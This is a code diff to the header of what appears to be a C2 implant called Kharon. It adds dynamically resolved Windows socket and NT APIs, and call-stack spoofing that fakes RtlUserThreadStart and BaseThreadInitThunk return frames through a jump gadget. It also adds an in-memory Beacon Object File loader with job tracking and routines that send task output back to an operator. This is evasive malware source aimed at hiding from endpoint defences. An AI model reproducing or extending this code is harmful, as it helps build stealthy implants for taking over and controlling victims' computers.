@@ -7,6 +7,7 @@
 #include <winsock.h>
 #include <ktmw32.h>
 #include <stdio.h>
+#include <ws2tcpip.h>
 
 namespace mscorlib {
     #include <Mscoree.h>
@@ -215,8 +216,10 @@ namespace Root {
             UPTR Handle;
 
             DECLAPI( vprintf );
+            DECLAPI( vsnprintf );
         } Msvcrt = {
-            RSL_TYPE( vprintf )
+            RSL_TYPE( vprintf ),
+            RSL_TYPE( vsnprintf ),
         };
 
         struct {
@@ -286,20 +289,32 @@ namespace Root {
             UPTR Handle;
 
             DECLAPI( closesocket );
+            DECLAPI( getaddrinfo );
+            DECLAPI( ntohs );
+            DECLAPI( select );
             DECLAPI( send );
+            DECLAPI( setsockopt );
             DECLAPI( connect );
             DECLAPI( inet_addr );
             DECLAPI( htons );
             DECLAPI( socket );
             DECLAPI( recv );
+            DECLAPI( ioctlsocket );
+            DECLAPI( freeaddrinfo );
         } Ws2_32 = {
             RSL_TYPE( closesocket ),
+            RSL_TYPE( getaddrinfo ),
+            RSL_TYPE( ntohs ),
+            RSL_TYPE( select ),
             RSL_TYPE( send ),
+            RSL_TYPE( setsockopt ),
             RSL_TYPE( connect ),
             RSL_TYPE( inet_addr ),
             RSL_TYPE( htons ),
             RSL_TYPE( socket ),
             RSL_TYPE( recv ),
+            RSL_TYPE( ioctlsocket ),
+            RSL_TYPE( freeaddrinfo )
         };
 
         struct {
@@ -308,6 +323,7 @@ namespace Root {
             DECLAPI( LoadLibraryA ); 
             DECLAPI( GetProcAddress );
             DECLAPI( GetModuleHandleA );
+            DECLAPI( GetModuleHandleW );
             DECLAPI( EnumProcessModules );
             DECLAPI( K32GetModuleFileNameExA );
             DECLAPI( GetModuleFileNameW );
@@ -363,6 +379,8 @@ namespace Root {
             DECLAPI( ResumeThread );
             DECLAPI( CreateThread );
             DECLAPI( CreateRemoteThread );
+
+            DECLAPI( BaseThreadInitThunk );
         
             DECLAPI( GlobalMemoryStatusEx );
             DECLAPI( GetNativeSystemInfo );
@@ -401,6 +419,7 @@ namespace Root {
             RSL_TYPE( LoadLibraryA ),
             RSL_TYPE( GetProcAddress ),
             RSL_TYPE( GetModuleHandleA ),
+            RSL_TYPE( GetModuleHandleW ),
             RSL_TYPE( EnumProcessModules ),
             RSL_TYPE( K32GetModuleFileNameExA ),
             RSL_TYPE( GetModuleFileNameW ),
@@ -457,6 +476,8 @@ namespace Root {
             RSL_TYPE( CreateThread ),
             RSL_TYPE( CreateRemoteThread ),
         
+            RSL_TYPE( BaseThreadInitThunk ),
+
             RSL_TYPE( GlobalMemoryStatusEx ),
             RSL_TYPE( GetNativeSystemInfo ),
             RSL_TYPE( FormatMessageA ),
@@ -515,6 +536,8 @@ namespace Root {
             DECLAPI( NtOpenThread );
             DECLAPI( RtlExitUserThread );
             DECLAPI( RtlExitUserProcess );
+
+            DECLAPI( RtlUserThreadStart );
     
             DECLAPI( RtlCaptureContext );
             DECLAPI( NtGetContextThread );
@@ -579,6 +602,8 @@ namespace Root {
             RSL_TYPE( NtOpenThread ),
             RSL_TYPE( RtlExitUserThread ),
             RSL_TYPE( RtlExitUserProcess ),
+
+            RSL_TYPE( RtlUserThreadStart ),
     
             RSL_TYPE( RtlCaptureContext ),
             RSL_TYPE( NtGetContextThread ),
@@ -817,11 +842,18 @@ public:
     BOOL ProxyCall = KH_PROXY_CALL;
 
     struct {
-        UPTR FirstFrame;
-        UPTR SecondFrame;
+        UPTR FirstFrame;   // RtlUserThreadStart+0x2c
+        UPTR SecondFrame;  // BaseThreadInitThunk+0x17
+        UPTR FirstSize;
+        UPTR SecondSize;
         UPTR JmpGadget;
+        UPTR JmpRef;
         UPTR ArgCount;
-    } Setup;
+        UPTR Args[8];
+    } Setup = {
+        .FirstFrame  = (UPTR)this->Self->Ntdll.RtlUserThreadStart + 0x2c,
+        .SecondFrame = (UPTR)this->Self->Krnl32.BaseThreadInitThunk + 0x17,
+    };
 
     auto TimerCall(
         _In_ UPTR Context,
@@ -833,10 +865,11 @@ public:
         _In_ INT8 Identifier
     ) -> LONG;
 
+    template <typename... Args>
     auto Call( 
         _In_ UPTR Lib, 
         _In_ UPTR Fnc, 
-        ... 
+        Args... args
     );
 
     auto GetStackSize(
@@ -854,19 +887,48 @@ public:
     );
 };
 
+struct _BOF_OBJ {
+    VOID* MmBegin;
+    VOID* MmEnd;
+    CHAR* UUID;
+    ULONG CmdID;
+
+    struct _BOF_OBJ* Next;
+};
+
+typedef _BOF_OBJ BOF_OBJ;
+
 class Coff {
-private:
-    Root::Kharon* Self;    
 public:
+    Root::Kharon* Self;   
+
     Coff( Root::Kharon* KharonRf ) : Self( KharonRf ) {}
 
     PPACKAGE Pkg = { 0 };
 
     BOOL Hook = KH_BOF_HOOK_ENALED;
 
+    BOF_OBJ* Node     = nullptr;
+    ULONG    ObjCount = 0;
+
+    // todo hooks
+    // struct {
+    //     UPTR Hash;
+    //     UPTR Ptr;
+    // } HookTable[10] = {
+    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Mm->Alloc },
+    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.VirtualAllocEx },
+    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.VirtualProtect },
+    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.VirtualProtectEx },
+    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.WriteProcessMemory },
+    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.ReadProcessMemory },
+    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.LoadLibraryA },
+    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.VirtualAlloc },
+    // };
+
     struct {
-        UPTR  SymHash;
-        PVOID SymPtr;
+        UPTR  Hash;
+        PVOID Ptr;
     } ApiTable[30] = {        
         ApiTable[0]  = { Hsh::Str("BeaconDataParse"),        reinterpret_cast<PVOID>(&Coff::DataParse) },
         ApiTable[1]  = { Hsh::Str("BeaconDataInt"),          reinterpret_cast<PVOID>(&Coff::DataInt) },
@@ -890,6 +952,25 @@ public:
         // ApiTable[19] = { Hsh::Str("BeaconGetSpawnTo"),       reinterpret_cast<PVOID>(&Coff::GetSpawn) },
     };
 
+    auto Add(
+        VOID* MmBegin,
+        VOID* MmEnd,
+        CHAR* UUID,
+        ULONG CmdID
+    ) -> BOF_OBJ*;
+
+    auto GetTask(
+        VOID* Address
+    ) -> CHAR*;
+
+    auto GetCmdID(
+        VOID* Address
+    ) -> ULONG;
+
+    auto Rm(
+        BOF_OBJ* Obj
+    ) -> BOOL;
+
     inline auto RslRel(
         _In_ PVOID  Base,
         _In_ PVOID  Rel,
@@ -904,7 +985,9 @@ public:
         _In_ BYTE* Buffer,
         _In_ ULONG Size,
         _In_ BYTE* Args,
-        _In_ ULONG Argc
+        _In_ ULONG Argc,
+        _In_ CHAR* UUID,
+        _In_ ULONG CmdID
     ) -> BOOL;
 
     static auto DataExtract(
@@ -1260,35 +1343,35 @@ public:
     Jobs( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     ULONG Count = 0;
-    PJOBS List  = nullptr;
+    JOBS* List  = nullptr;
 
     auto Create(
-        _In_ PCHAR UUID, 
-        _In_ PPARSER Parser
-    ) -> PJOBS;
+        _In_ CHAR*   UUID, 
+        _In_ PARSER* Parser
+    ) -> JOBS*;
     
     auto Send( 
-        _In_ PPACKAGE PostJobs 
+        _In_ PACKAGE* PostJobs 
     ) -> VOID;
 
     auto ExecuteAll( VOID ) -> VOID;
     
     auto static Execute(
-        _In_ PJOBS Job
+        _In_ JOBS* Job
     ) -> ERROR_CODE;
     
     auto GetByUUID(
-        _In_ PCHAR UUID
-    ) -> PJOBS;
+        _In_ CHAR* UUID
+    ) -> JOBS*;
     
     auto GetByID(
         _In_ ULONG ID
-    ) -> PJOBS;
+    ) -> JOBS*;
 
     auto Cleanup( VOID ) -> VOID;
     
     auto Remove(
-        _In_ PJOBS Job
+        _In_ JOBS* Job
     ) -> BOOL;
 };
 
@@ -1424,6 +1507,20 @@ public:
         _In_ SIZE_T len
     ) -> char*;
 
+    auto SendOut(
+        _In_ CHAR* UUID,
+        _In_ ULONG CmdID,
+        _In_ BYTE* Buffer,
+        _In_ INT32 Length,
+        _In_ ULONG Type
+    ) -> BOOL;
+
+    auto SendMsg(
+        _In_ CHAR* UUID,
+        _In_ CHAR* Message,
+        _In_ ULONG Type
+    ) -> BOOL;
+
     auto Base64Dec(
         const char* in, 
         unsigned char* out, 
@@ -1520,7 +1617,7 @@ private:
 public:
     Parser( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    BOOL    Endian;
+    BOOL    Endian = FALSE;
     PPARSER Shared;
 
     auto NewTask( 
